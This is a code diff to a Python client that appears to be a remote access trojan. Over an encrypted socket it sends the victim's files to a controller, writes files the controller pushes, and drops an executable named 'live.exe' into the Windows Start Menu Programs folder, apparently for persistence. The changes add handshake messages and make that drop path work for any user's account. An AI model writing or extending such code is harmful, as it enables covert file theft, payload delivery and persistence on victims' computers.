@@ -1,4 +1,4 @@
-import os, subprocess, socket
+import os, subprocess, socket, time
 from cryptography.fernet import Fernet
 
 
@@ -31,7 +31,16 @@ while True:
     if command == "/getfile":
         filename = s.recv(BUFFER_SIZE)
         filename = Fernet(key).decrypt(filename).decode()
+        if filename not in os.listdir():
+            path_exist = Fernet(key).encrypt("no".encode())
+            s.send(path_exist)
+            continue
         if filename in os.listdir():
+            path_exist = Fernet(key).encrypt("yes".encode())
+            s.send(path_exist)
+            time.sleep(0.5)
+            file_start = Fernet(key).encrypt((f"receiving {filename}").encode())
+            s.send(file_start)
             with open(filename, "rb") as f:
                 data = f.read()
                 dataLen = len(data)
@@ -39,18 +48,26 @@ while True:
                 s.send(data)
             f.close()
     if command == "/sendfile":
-        filename = s.recv(BUFFER_SIZE)
-        filename = Fernet(key).decrypt(filename).decode()
-        remaining = int.from_bytes(s.recv(4),'big')
-        f = open(filename,"wb")
-        while remaining:
-            data = s.recv(min(remaining,4096))
-            remaining -= len(data)
-            f.write(data)
-        f.close()
+        file_location = s.recv(BUFFER_SIZE)
+        file_location = Fernet(key).decrypt(file_location).decode()
+        if file_location == "no":
+            continue
+        if file_location == "yes":
+            filename = s.recv(BUFFER_SIZE)
+            filename = Fernet(key).decrypt(filename).decode()
+            remaining = int.from_bytes(s.recv(4),'big')
+            f = open(filename,"wb")
+            while remaining:
+                data = s.recv(min(remaining,4096))
+                remaining -= len(data)
+                f.write(data)
+            f.close()
+            file_finish = Fernet(key).encrypt((f"Sent {filename}").encode())
+            s.send(file_finish)
     if command == "/getlive":
-        directory = r'"C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe"'
-        if os.path.exists(r'C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe'):
+        userprofile = subprocess.getoutput("echo %username%")
+        directory = fr'"C:\Users\{userprofile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe"'
+        if os.path.exists(fr'C:\Users\{userprofile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe'):
             server_location = "yes"
             server_location = Fernet(key).encrypt(server_location.encode())
             s.send(server_location)
@@ -59,7 +76,7 @@ while True:
             server_location = Fernet(key).encrypt(server_location.encode())
             s.send(server_location)
             remaining = int.from_bytes(s.recv(4),'big')
-            f = open(r'C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe',"wb")
+            f = open(fr'C:\Users\{userprofile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe', 'wb')
             while remaining:
                 data = s.recv(min(remaining,4096))
                 remaining -= len(data)
